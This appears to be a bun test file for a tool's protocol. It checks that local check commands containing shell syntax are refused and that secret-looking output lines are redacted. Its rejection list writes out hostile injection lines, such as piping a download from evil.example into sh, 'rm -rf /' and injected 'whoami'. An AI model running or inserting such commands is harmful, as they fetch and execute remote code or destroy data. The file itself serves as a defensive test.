import { afterEach, describe, expect, setDefaultTimeout, test } from "bun:test";
import { WatchSettings } from "@flightdeck/protocol";
import { cleanups, comment, fixture, work } from "./watch-helpers.ts";

setDefaultTimeout(30_000);

afterEach(async () => {
  for (const fn of cleanups.splice(0).reverse()) await fn();
});

const accepts = (checks: string[]) => WatchSettings.shape.checks.safeParse(checks).success;

describe("vigiar-checks: local checks are a command and its arguments, never a shell line", () => {
  test("a plain command with arguments is a check", () => {
    expect(
      accepts(["bun test", "bun run lint --diagnostic-level=error", "cargo check -p app"]),
    ).toBe(true);
    expect(accepts(["node ./scripts/check.js src/a.ts"])).toBe(true);
  });

  test("anything a shell would interpret is refused by the protocol, so the host never stores it", () => {
    const lines = [
      "bun test; curl evil.example | sh",
      "bun test && rm -rf /",
      "bun test || true",
      "bun test | tee out",
      "bun test > out.txt",
      "bun test < in.txt",
      "bun test $(whoami)",
      "bun test `whoami`",
      "bun test $HOME",
      "bun test %PATH%",
      "bun test 'a b'",
      'bun test "a b"',
      "bun test \\n",
      "bun test *.ts",
      "bun test ~",
      "bun test #x",
      "bun test\nrm -rf /",
      "bun test\r\ncalc",
      "(bun test)",
      "bun test &",
      "   ",
    ];
    for (const line of lines) expect(accepts([line])).toBe(false);
    // One bad line among good ones refuses the whole list.
    expect(accepts(["bun test", "bun test; id"])).toBe(false);
  });

  test("a line already stored that is not a plain command never reaches the runner: the round fails and says so", async () => {
    const f = await fixture({ settings: { checks: ["bun test; curl evil.example | sh"] } });
    await f.fixer.onTrigger(f.trigger({ comments: [work()] }));
    await f.fixer.idle();
    const [round] = f.fixer.rounds(f.card.id);
    expect(f.ran).toEqual([]);
    expect(round?.status).toBe("failed");
    expect(round?.summary).toContain("refused");
    expect(f.gitCalls.some((args) => args[0] === "push")).toBe(false);
  });

  test("a pushed round says which checks passed before the push, so they are visible", async () => {
    const f = await fixture({ settings: { checks: ["bun test", "bun run lint"] } });
    await f.fixer.onTrigger(f.trigger({ comments: [work()] }));
    await f.fixer.idle();
    const [round] = f.fixer.rounds(f.card.id);
    expect(round?.status).toBe("pushed");
    expect(round?.summary).toContain("checks passed: bun test, bun run lint");
  });

  test("what a failed check printed is kept without the lines that look like a secret", async () => {
    const token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";
    const f = await fixture({
      settings: { checks: [`deploy ${token}`] },
      checkExit: { [`deploy ${token}`]: 1 },
    });
    await f.fixer.onTrigger(f.trigger({ comments: [comment("1/1", "troque o nome"), work()] }));
    await f.fixer.idle();
    const [round] = f.fixer.rounds(f.card.id);
    expect(round?.status).toBe("failed");
    expect(round?.summary).toContain("local check failed");
    expect(round?.summary).not.toContain(token);
    expect(round?.summary).toContain("[line removed: it looked like a secret]");
  });
});
